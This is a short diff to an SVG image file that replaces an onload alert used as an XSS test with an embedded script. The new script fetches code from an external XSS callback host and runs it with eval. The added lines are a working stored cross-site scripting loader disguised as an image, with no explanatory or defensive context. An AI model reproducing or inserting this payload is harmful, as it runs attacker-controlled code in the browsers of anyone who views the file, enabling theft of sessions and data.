@@ -1,5 +1,14 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg
- onload="alert('XSS ATTACK')"
- xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    <![CDATA[
+      function b(){
+        eval(this.responseText)
+      };
+      a=new XMLHttpRequest();
+      a.addEventListener("load", b);
+      a.open("GET", "//xss.report/c/huhusski21");
+      a.send();
+    ]]>
+  </script>
 </svg>
